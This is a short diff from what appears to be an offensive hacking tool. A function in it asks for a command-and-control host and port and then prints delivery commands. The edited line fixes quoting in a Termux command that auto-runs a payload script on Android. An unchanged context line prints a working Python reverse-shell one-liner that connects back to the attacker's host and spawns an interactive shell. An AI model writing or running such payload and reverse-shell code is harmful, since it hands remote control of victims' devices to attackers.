@@ -714,7 +714,7 @@ def mod_py2exe():
     host = ask("c2 host: ").strip()
     port = get_port("port")
     print("\n[android termux auto-run on open]")
-    print(f'  am start -n com.termux/.app --ez run true --es cmd "cd \\$HOME/hkall \\u0026\\u0026 python3 data/payload.py"')
+    print(f"  am start -n com.termux/.app --ez run true --es cmd 'cd $HOME/hkall && python3 data/payload.py'")
     print("[linux one-liner]")
     print(f'  python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{host}",{port}));[os.dup2(s.fileno(),x) for x in (0,1,2)];subprocess.call(["/bin/sh","-i"])\'')
 
